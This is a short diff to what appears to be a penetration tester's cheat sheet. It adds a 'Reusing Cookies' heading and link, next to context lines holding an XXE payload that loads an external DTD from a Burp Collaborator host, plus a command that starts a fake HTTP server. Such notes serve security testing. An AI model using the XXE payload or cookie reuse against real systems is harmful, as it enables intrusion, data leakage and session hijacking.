@@ -228,6 +228,9 @@
 	XXE
 		<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
 
+### Reusing Cookies
+	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
+
 ### Fake Server
 	# HTTP
 		python -m SimpleHTTPServer 8080
